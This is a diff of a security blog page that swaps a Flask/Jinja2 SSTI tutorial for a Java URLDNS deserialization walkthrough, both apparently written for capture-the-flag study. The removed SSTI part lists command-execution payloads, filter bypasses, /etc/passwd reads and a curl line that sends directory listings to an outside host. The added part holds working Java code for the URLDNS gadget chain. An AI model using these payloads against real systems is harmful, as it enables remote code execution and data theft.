@@ -4,12 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="ssti模板注入, Ethe&#39;s blog">
-    <meta name="description" content=" 不会python看的我好懵，一些类、对象和魔术变量的部分都不是太懂。。。。
- 
-
-ssti概述贴个大佬的文章
-浅析SSTI(python沙盒绕过)_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)">
+    <meta name="keywords" content="Java反序列化之URLDNS, Ethe&#39;s blog">
+    <meta name="description" content="基础的理论写在这里了，这篇主要是跟一下URLDNS链
+Java | Ethe&amp;#39;s blog (ethe448.github.io)
+URLDNS链反序列化分三个部分
+入口类、调用链和执行类
+接下来将对其依次进行分析
+入口类这里的入口">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +22,7 @@ ssti概述贴个大佬的文章
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>ssti模板注入 | Ethe&#39;s blog</title>
+    <title>Java反序列化之URLDNS | Ethe&#39;s blog</title>
     <link rel="icon" type="image/png" href="https://epicture.oss-cn-beijing.aliyuncs.com/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -325,12 +326,12 @@ ssti概述贴个大佬的文章
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">ssti模板注入</h1>
+                    <h1 class="description center-align post-title">Java反序列化之URLDNS</h1>
                 </div>
             </div>
         </div>
@@ -464,8 +465,12 @@ ssti概述贴个大佬的文章
                                 <span class="chip bg-color">web学习</span>
                             </a>
                         
-                            <a href="/tags/ssti%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">ssti注入</span>
+                            <a href="/tags/Java/">
+                                <span class="chip bg-color">Java</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                <span class="chip bg-color">反序列化</span>
                             </a>
                         
                     </div>
@@ -480,28 +485,28 @@ ssti概述贴个大佬的文章
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-06-25
+                    2023-03-18
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-05-15
+                    2023-03-20
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.7k
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    12 分
+                    5 分
                 </div>
                 
 
@@ -524,244 +529,149 @@ ssti概述贴个大佬的文章
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p> 不会python看的我好懵，一些类、对象和魔术变量的部分都不是太懂。。。。</p>
- <span id="more"></span>
-
-<h2 id="ssti概述"><a href="#ssti概述" class="headerlink" title="ssti概述"></a>ssti概述</h2><p>贴个大佬的文章</p>
-<p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-47685-1-1.html?from=aqzx8">浅析SSTI(python沙盒绕过)_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11425368.html">CTF SSTI(服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com)</a></p>
-<p>[关于python魔术方法payload：““.<strong>class</strong>.<strong>mro</strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiao__1bai/article/details/115672392">2].<strong>subclasses</strong>()<a href="%E2%80%9C/etc/passwd%E2%80%9C">40</a>.read() 的解释_xiao__1bai的博客-CSDN博客</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/104307948?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">模板注入总结_Herbert_555的博客-CSDN博客</a></p>
-<p>SSTI(Server-Side Template Injection);即模板注入，与我们熟知的SQL注入、命令注入等原理大同小异。注入的原理可以这样描述：当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑；<br>漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，{ { } }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{ { } }包裹的内容当做变量解析替换。比如{ {1+1} }会被解析成2。</p>
-<p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p>
-<pre class="language-python" data-language="python"><code class="language-python">__dict__ 保存类实例或对象实例的属性变量键值对字典
-__class__  返回类型所属的对象
-__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
-__bases__   返回该对象所继承的基类
-&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的
-
-__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
-__init__  类的初始化方法
-__globals__  函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</code></pre>
-
-<p><strong>flask基本知识</strong></p>
-<p>flask采用装饰器来指定路由，默认的模板渲染引擎为<strong>Jinja2</strong>。其中模板的三种主要语法为</p>
-<ul>
-<li>：装载一个变量，渲染模板的时候，可以传入变量名和变量值模板会自动替换变量为传入的变量值</li>
-<li>{ % … % }:装载一个控制语句</li>
-<li>:装载一个注释</li>
-</ul>
-<p><strong>流程：</strong></p>
+                <p>基础的理论写在这里了，这篇主要是跟一下URLDNS链</p>
+<p><a href="https://ethe448.github.io/2023/03/16/Java/#toc-heading-14">Java | Ethe&#39;s blog (ethe448.github.io)</a></p>
+<h1 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h1><p>反序列化分三个部分</p>
+<p>入口类、调用链和执行类</p>
+<p>接下来将对其依次进行分析</p>
+<h2 id="入口类"><a href="#入口类" class="headerlink" title="入口类"></a>入口类</h2><p>这里的入口类是HashMap</p>
+<p>首先HashMap里重写了readObject</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318175144585.png" alt="image-20230318175144585"></p>
+<p>在最后的地方</p>
+<p>将对象中的内容一个一个拿了出来然后调用了putVal函数</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318175200362.png" alt="image-20230318175200362"></p>
+<p>这个函数具体的可以看这个<a target="_blank" rel="noopener" href="https://blog.csdn.net/ljf199701/article/details/106309417/">HashMap中的putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict)解读_余韵啊的博客-CSDN博客</a></p>
+<p>简单来说就是判断传入的内容的key的值是不是相等，不相等就加进map里，相等就覆盖</p>
+<p>这里对key调用了hash函数，跟进去</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318175918432.png" alt="image-20230318175918432"></p>
+<p>又调用了key自身的hashCode函数</p>
+<p>这个hashCode是Object自带的，所以HashMap满足我们入口类的三个条件（重写了readObject，参数类型宽泛，jdk自带）</p>
+<p>所以接下来考虑有没有可能存在某个特殊的类**<code>M</code><strong>，其</strong><code>hashCode</code>**方法中直接或间接可调用危险函数，当M是key时，调用key.hashCode()，就相当于调用了M.hashCode()，从而触发危险函数。</p>
+<h2 id="执行类"><a href="#执行类" class="headerlink" title="执行类"></a>执行类</h2><p>接下来我们再来看执行类</p>
+<p>这里执行类就是URL类</p>
+<p>跟进去找URL的hashCode方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318180244597.png" alt="image-20230318180244597"></p>
+<p>如果hashCode这个参数为-1，也就是初始值时，会调用handler的hashCode方法。</p>
+<p>这里看一下handler是个什么东西</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318181515789.png" alt="image-20230318181515789"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318183016507.png" alt="image-20230318183016507"></p>
+<p>是URLStreamHandler类（也是我们传入的handler），也就是说这里调用的是URLStreamHandler.hashCode</p>
+<p>跟进去之后有个getHostAddress方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318181320932.png" alt="image-20230318181320932"></p>
+<p>再往里跟会发现u是通过InetAddress.getByName获取到的ip地址</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318181948359.png" alt="image-20230318181948359"></p>
+<p>然后再通过getHost发送一个DNS请求</p>
+<p>至此执行类的分析完成</p>
+<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>最后一部分是调用链，其实从入口类和执行类的分析就可以大概的看出调用链</p>
 <ol>
-<li><p>​    获取基本类</p>
-</li>
-<li><p>​    获取基本类的子类</p>
-</li>
-<li><p>​    找到重载过的<code>__init__</code>类</p>
-</li>
-<li><p>​    查看其引用<code>__builtins__</code></p>
-</li>
-<li><p>​    调用其中可用的函数</p>
-</li>
+<li>HashMap -&gt; readObject()</li>
+<li>HashMap -&gt; hash()</li>
+<li>URL -&gt; hashCode()</li>
+<li>URLStreamHandler -&gt; hashCode()</li>
+<li>URLStreamHandler -&gt; getHostAddress()</li>
+<li>InetAddress-&gt; getByName()</li>
 </ol>
-<p><strong>获取基本类</strong></p>
-<p>​        利用<code>__bases__</code>或者是<code>__mro__</code>函数</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2] 
-&#123;&#125;.__class__.__bases__[0]
-().__class__.__bases__[0]
-[].__class__.__bases__[0]
-request.__class__.__mro__[8] &#x2F;&#x2F;针对jinjia2&#x2F;flask为[9]适用
-</code></pre>
+<h2 id="初次利用"><a href="#初次利用" class="headerlink" title="初次利用"></a>初次利用</h2><p>先在bp上生成一个url接收DNS请求，dnslog也行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318184455889.png" alt="image-20230318184455889"></p>
+<p>根据前边说的，利用就是创建个HashMap然后把key的位置传入URL类</p>
+<pre class="language-none"><code class="language-none">HashMap&lt;Object,Integer&gt; h &#x3D; new HashMap&lt;&gt;();
+h.put(new URL(&quot;http:&#x2F;&#x2F;xxxx&quot;),1);</code></pre>
 
-<p>//实话实说最后一个不是很懂</p>
-<p><strong>获取基类的子类</strong></p>
-<p>​    利用<code>__subclasses__</code>函数</p>
-<pre class="language-python" data-language="python"><code class="language-python">object.__subclasses__()
-&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;&#x2F;&#x2F;这句可以查找所有的类</code></pre>
+<p>然后我们对其进行序列化，然后再进行反序列化，在反序列化时我们就可以收到一个DNS请求</p>
+<p>但是在实验过程中，我们会发现，就算没有进行反序列化，在bp上也同样能检测到有一个发送过来的请求</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318184207283.png" alt="image-20230318184207283"></p>
+<p>为什么会这样呢？</p>
+<p>其实原因在put方法里</p>
+<p>跟进去看一下可以看见</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318195923449.png" alt="image-20230318195923449"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318195933134.png" alt="image-20230318195933134"></p>
+<p>在我们put的时候，就已经触发了hashCode函数，相当于走完了我们的利用链，然后向目标地址发送了dns请求。</p>
+<p>但是这并不是我们想要的</p>
+<p>因为URL里的hashCode中的这个判断</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318180244597.png" alt="image-20230318180244597"></p>
+<p>hashCode的初始值是-1，但是经过put走完我们的链子后，hashCode的值就会被改变，这时如果我们再执行反序列化，由于hashCode的值不再是-1，就不能再调用handler.hashCode的值从而实现向目标url发送dns请求的目的了。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318201605984.png" alt="image-20230318201605984"></p>
+<p>因此，这里在put后，还需要使用反射让hashCode的值重新为-1</p>
+<h2 id="再次利用"><a href="#再次利用" class="headerlink" title="再次利用"></a>再次利用</h2><pre class="language-java" data-language="java"><code class="language-java">public class serializTest &#123;
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;1.bin&quot;));
+        objectOutputStream.writeObject(obj);
+    &#125;
+    public static Object unserialize() throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(&quot;1.bin&quot;));
+        Object o &#x3D; ois.readObject();
+        return o;
+    &#125;
 
-<p>SSTI的主要目的就是从这么多子类中找出可以利用的类（一般是指读写文件的类）加以利用</p>
-<p>我们可以利用的方法有&lt;type &#39;file&#39;&gt;等，（一般file在第40号）</p>
-<p><strong>找到重载过的<code>__init__</code>类</strong></p>
-<pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__
-	&lt;unbound method WarningMessage.__init__
-    
-    &#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings)
-可以查看当前位置，</code></pre>
+&#125;</code></pre>
 
-<p> <strong>查看其引用<code>__builtins__</code></strong></p>
-<pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]</code></pre>
+<pre class="language-JAVA" data-language="JAVA"><code class="language-JAVA">package URLDNS;
+import serializTest.serializTest;
+import java.io.IOException;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java.util.HashMap;
 
-<p><strong>使用os模块执行命令来读取flag或者执行命令</strong></p>
-<pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)
+public class Test &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException &#123;
+        HashMap&lt;Object,Integer&gt; h &#x3D; new HashMap&lt;&gt;();
+        &#x2F;&#x2F; 反射获取hashCode的值
+        Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;java.net.URL&quot;);
+        Field hashCode &#x3D; aClass.getDeclaredField(&quot;hashCode&quot;);
+        hashCode.setAccessible(true);
 
-&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)&#125;&#125;
-</code></pre>
+        URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;cp9s9x.dnslog.cn&quot;);
+        &#x2F;&#x2F; 防止在put时就发送请求，干扰判断
+        hashCode.set(url,1);
 
-<p><strong>来、姿势</strong></p>
-<p><strong>1、config</strong></p>
-<p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前</p>
-<p><code>&#123;&#123;config&#125;&#125;</code>可以获取当前设置，如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>得到flag</p>
-<p><strong>2、self</strong></p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt;
-&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config</code></pre>
+        System.out.println(hashCode.get(url));
+        &#x2F;&#x2F; 装入HashMap
+        h.put(url,1);
+        &#x2F;&#x2F; 改回-1使反序列化时进行dns请求
+        hashCode.set(url,-1);
+        serializTest.serialize(h);
+        System.out.println(hashCode.get(url));
 
-<p><strong>3、&quot;&quot;、[]、()等数据结构</strong></p>
-<p>主要目的是配合<code>__class__.__mro__[2]</code>这样找到<code>object</code>类<br><code>&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125;</code></p>
-<p><strong>4、url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等</strong></p>
-<p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。</p>
-<p>例如：</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;
-&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125;
-&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125;</code></pre>
+        Object unserialize &#x3D; serializTest.unserialize();
+        System.out.println(unserialize);
 
+    &#125;
+&#125;</code></pre>
 
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318204055248.png" alt="image-20230318204055248"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230318204014975.png" alt="image-20230318204014975"></p>
+<h2 id="CTFSHOW-Web846"><a href="#CTFSHOW-Web846" class="headerlink" title="CTFSHOW Web846"></a>CTFSHOW Web846</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319153251549.png" alt="image-20230319153251549"></p>
+<p>为了实现这个目的，我们可以把序列化的内容写到一个输出流里，然后用toByteArray将字节流转换为字节数组，再用base64编码输出</p>
+<p>修改后的代码为</p>
+<pre class="language-java" data-language="java"><code class="language-java">        HashMap&lt;Object,Integer&gt; h &#x3D; new HashMap&lt;&gt;();
+        &#x2F;&#x2F; 反射获取hashCode的值
+        Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;java.net.URL&quot;);
+        Field hashCode &#x3D; aClass.getDeclaredField(&quot;hashCode&quot;);
+        hashCode.setAccessible(true);
 
-<p><strong>常见的过滤绕过</strong></p>
-<p><strong>(1)只过滤<code>[]</code></strong></p>
-<blockquote>
-<p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。<br><code>&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()</code><br>若<code>.</code>也被过滤，使用原生JinJa2函数<code>|attr()</code><br>将<code>request.__class__</code>改成<code>request|attr(&quot;__class__&quot;)</code></p>
-</blockquote>
-<p><strong>(2)过滤_</strong></p>
-<p>利用<code>request.args</code>属性<br><code>&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code><br>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p>
-<p><strong>(3)关键字过滤</strong></p>
-<ul>
-<li>base64编码绕过<br><code>__getattribute__</code>使用实例访问属性时,调用该方法</li>
-</ul>
-<p>例如被过滤掉<code>__class__</code>关键词<br><code>&#123;&#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code></p>
-<ul>
-<li>字符串拼接绕过<br><code>&#123;&#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()&#125;&#125;</code><br><code>&#123;&#123;[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]&#125;&#125;</code></li>
-</ul>
-<p><strong>(4)过滤{ {</strong></p>
-<p>使用<code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code>，例如</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.bin.buuoj.cn&#x2F;1inhq4f1 -d &#96;ls &#x2F; |  grep flag&#96;;&#39;) %&#125;1&#123;% endif %&#125;</code></pre>
+        URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;c83f8a14-f34c-4106-ae2b-0f835c562ad4.challenge.ctf.show&quot;);&#x2F;&#x2F;网址最后的斜杠要删掉
+        &#x2F;&#x2F; 防止在put时就发送请求，干扰判断
+        hashCode.set(url,1);
+&#x2F;&#x2F;
+&#x2F;&#x2F;        System.out.println(hashCode.get(url));
+        &#x2F;&#x2F; 装入HashMap
+        h.put(url,1);
+        &#x2F;&#x2F; 改回-1使反序列化时进行dns请求
+        hashCode.set(url,-1);
+&#x2F;&#x2F;        serializTest.serialize(h);
+        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(h);
+&#x2F;&#x2F;        System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray()));
+        byte[] buf &#x3D; byteArrayOutputStream.toByteArray();
+        &#x2F;&#x2F; base64编码
+        Base64.Encoder encoder &#x3D; Base64.getEncoder();
+        String base64 &#x3D; encoder.encodeToString(buf);
+        System.out.println(base64);</code></pre>
 
-<p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;test&#39;).read()[0:1]&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</code></pre>
-
-<p><strong>(5)引号内十六进制绕过</strong></p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&quot;&quot;.__class__&#125;&#125;
-&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;]&#125;&#125;
-_&#96;是&#96;\x5f&#96;，&#96;.&#96;是&#96;\x2E</code></pre>
-
-<p><strong>(6)&quot; &#39; chr等被过滤，无法引入字符串</strong></p>
-<ul>
-<li>直接拼接键名</li>
-</ul>
-<pre class="language-python" data-language="python"><code class="language-python">dict(buil&#x3D;aa,tins&#x3D;dd)|join()</code></pre>
-
-<ul>
-<li>利用<code>string</code>、<code>pop</code>、<code>list</code>、<code>slice</code>、<code>first</code>等过滤器从已有变量里面直接找</li>
-</ul>
-<pre class="language-python" data-language="python"><code class="language-python">(app.__doc__|list()).pop(102)|string()</code></pre>
-
-<ul>
-<li>构造出<code>%</code>和<code>c</code>后，用格式化字符串代替<code>chr</code></li>
-</ul>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;%set udl&#x3D;dict(a&#x3D;pc,c&#x3D;c).values()|join %&#125;      # uld&#x3D;%c
-&#123;%set i1&#x3D;dict(a&#x3D;i1,c&#x3D;udl%(99)).values()|join %&#125;</code></pre>
-
-<p><strong>(7)+等被过滤，无法拼接字符串</strong></p>
-<ul>
-<li><code>~</code><br>在jinja中可以拼接字符串</li>
-<li>格式化字符串<br>同上</li>
-</ul>
-<p>例一：<br>warnings.catch_warnings类</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</code></pre>
-
-<p>PS：由于使用[‘globals’]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[‘glo’+&#39;bals’]</p>
-<p>最后获取flag</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125;   </code></pre>
-
-<p>例二：</p>
-<pre class="language-python" data-language="python"><code class="language-python">class’site._Printer’类
-
-&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</code></pre>
-
-<p>获取flag</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125;</code></pre>
-
-<p>例三：<br>popen</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;
-&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;
-&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125;</code></pre>
-
-<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>搭了个靶场</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213543193.png" alt="image-20210627213543193"></p>
-<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>先找基本类</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213659700.png" alt="image-20210627213659700"></p>
-<p>再获取基本类的子类</p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213839196.png" alt="image-20210627213839196"></p>
-<p>找到重载过的<code>__init__</code>类</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__&#125;&#125;</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214555384.png" alt="image-20210627214555384"></p>
-<p>查看其引用<code>__builtins__</code></p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214844624.png" alt="image-20210627214844624"></p>
-<p>利用eval命令执行来读取flag</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)&#125;&#125;</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627215059572.png" alt="image-20210627215059572"></p>
-<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>这个过滤了{ { ，所以要采用{ % % }的形式</p>
-<p>{ % % }内加控制语句</p>
-<p>且这里展示数据要利用{ % print % }</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;% print &#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) %&#125;</code></pre>
-
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627232829026.png" alt="image-20210627232829026"></p>
-<p>还有一种是利用控制语句</p>
-<p>寻找符合条件的子类再利用WarningMessage的<code>__bulitins__</code>执行代码这个还不太懂先贴一下payload</p>
-<pre class="language-python" data-language="python"><code class="language-python">&#123;%for sub in &#39;&#39;.__class__.__base__.__subclasses__()%&#125;&#123;%if  sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;&#123;%print sub.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code></pre>
-
-<p>补:</p>
